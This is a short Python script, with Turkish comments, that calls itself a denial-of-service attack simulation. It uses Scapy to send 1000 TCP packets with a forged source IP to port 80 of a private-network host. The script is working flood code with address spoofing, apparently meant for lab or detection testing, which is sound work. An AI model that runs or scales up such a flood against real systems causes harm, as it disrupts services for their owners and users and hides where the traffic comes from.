from scapy.all import send, IP, TCP
import time

# Saldırı Simülasyonu: Çok sayıda paket gönderme (DoS)
def simulate_attack():
    target_ip = "192.168.1.10"  # Hedef IP adresi
    target_port = 80            # Hedef port
    source_ip = "192.168.1.20"  # Kaynak IP (spoofed) sahte olan
    
    print("Saldırı simülasyonu başlıyor...")
    for i in range(1000):  # 1000 paket gönder
        packet = IP(src=source_ip, dst=target_ip) / TCP(sport=1234, dport=target_port)
        send(packet, verbose=False)
        time.sleep(0.01)  # Trafiği yavaşlatmak için

    print("Saldırı simülasyonu tamamlandı.")

simulate_attack()
